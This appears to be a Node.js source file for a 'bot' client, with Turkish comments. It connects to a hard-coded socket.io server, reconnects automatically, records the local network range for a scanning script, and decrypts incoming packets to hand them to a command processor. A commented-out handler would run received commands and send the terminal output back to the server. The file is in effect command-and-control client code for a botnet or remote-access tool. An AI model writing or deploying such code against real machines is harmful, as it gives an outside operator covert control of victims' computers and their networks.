var io = require('socket.io-client');
var parser = require('./utils/parser');
var fs = require('fs');

var crypto = require('./utils/crypto');


//reconnect parametresi bağlantı koptuğunda tekrardan sunucuya bağlanması için
var socket = io.connect('http://192.168.43.89:4000', {reconnect: true});

var receiver_id;
var sender_id;
var thisSocket;
var processor;

var ip = require('ip');
 
//Botun bulunduğu ağ adresini değişkene atama
var networkAddr = ip.mask(ip.address(), "255.255.255.0")+"-255";

console.log(networkAddr);

//Botun bulunduğu ip adresini script tarafından kullanılması için bulunduğu dizine kaydet.
fs.writeFile("./ipaddress.txt", networkAddr, function(err) {
    if(err) {
        return console.log(err);
    }

    console.log("The file was saved!");
}); 

socket.on('connect', function(data){
    console.log('connected!');

    thisSocket=socket;

    console.log("this socket="+socket);

    processor = require('./utils/processor')(thisSocket);

});

/*socket.on('run cmd', function(data){
    console.log(data);
    var child = new run_cmd(data);
    child.stdout.setEncoding('utf-8');
    child.stdout.on('data', function(data){
        console.log('veri gönderiliyor..');
        socket.emit('terminal', {output: data});
    });

}); */




//Burada şifreli veri parse edilecek.
socket.on('data', function(data){

    console.log("DATA="+data);
    var decrypted = crypto.decrypt(data);
    var decodedPacket = parser.decode(decrypted);

    //var output=run_cmd(decoded.data);
    receiver_id=decodedPacket.sender_id;
    sender_id=decodedPacket.receiver_id;
    //var output = processor.processPacket(decodedPacket, sender_id, receiver_id);

    processor.processPacket(decodedPacket, sender_id, receiver_id);




});


socket.on('disconnect', function(){
    console.log('disconnected!');
});
